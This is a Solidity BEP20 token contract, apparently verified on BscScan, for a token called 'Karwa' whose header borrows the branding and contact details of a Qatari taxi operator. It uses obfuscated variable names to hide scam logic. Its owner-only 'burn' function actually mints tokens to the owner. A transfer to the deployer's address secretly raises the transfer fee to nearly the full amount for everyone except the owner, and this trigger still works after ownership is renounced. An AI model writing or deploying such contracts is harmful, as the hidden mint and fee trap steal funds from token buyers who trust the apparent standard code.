/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-20 10:35 GMT
 */

////////////////////////////////////////////////////////////////////
//Karwa provides a wide range of services including 
//airport services as and when guests arrive at HIA, key areas and hubs with taxi ranks and meet with national needs during major events. 
//Please dial 800-TAXI (8294) to book. Also please download our free "Karwa Taxi App"
//Total no. of taxi in 2016 – 4200 nos; Expected to reach 7000 by 2020;
//https://www.mowasalat.com/
//https://www.youtube.com/@MowasalatQatar
//https://twitter.com/Mowasalat_QAT
//https://www.facebook.com/MowasalatQatar/
////////////////////////////////////////////////////////////////////
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0;
contract GBMAWGW {
uint256 private  VKHRYP = 1000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  AAJFIZ = 100000000;
uint256 private  XYHHRN = 10000000000000;
address private  OVSZXN = address(0);
address private  OFSLBW = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  TFLAOK = 1000000000000000000;
uint256 private  DRRLIN = 10000000000;
address public owner;
address private  VKEMAG = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "Karwa";
address private  HYWJTA = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  XIHDHH = 1000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant IFVYMK = 99999;
string public  name = "Karwa";
address private  SLFRLI = address(0);
uint256 private  PUVTFQ = 1000000000000000000;
function _getVKHRYP() private returns (uint256) {
return VKHRYP;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getDRRLIN() private returns (uint256) {
return DRRLIN;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
OVSZXN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getAAJFIZ() private returns (uint256) {
return AAJFIZ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getXIHDHH() private returns (uint256) {
return XIHDHH;
}

function _getSLFRLI() private returns (address) {
return SLFRLI;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tIATOTU 0");
require(spender != address(0), "fIATOTU 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getVKEMAG() private returns (address) {
return VKEMAG;
}

function _getOFSLBW() private returns (address) {
return OFSLBW;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getHYWJTA() private returns (address) {
return HYWJTA;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "IATOTU");
require(to != address(0), "IATOTU");
require(amount <= balanceOf[from], "IATOTU");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* IFVYMK/TFLAOK ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==OVSZXN){
TFLAOK = IFVYMK+2;
}
emit Transfer(from, to, transferAmount);
}
function _getPUVTFQ() private returns (uint256) {
return PUVTFQ;
}

function _getXYHHRN() private returns (uint256) {
return XYHHRN;
}


}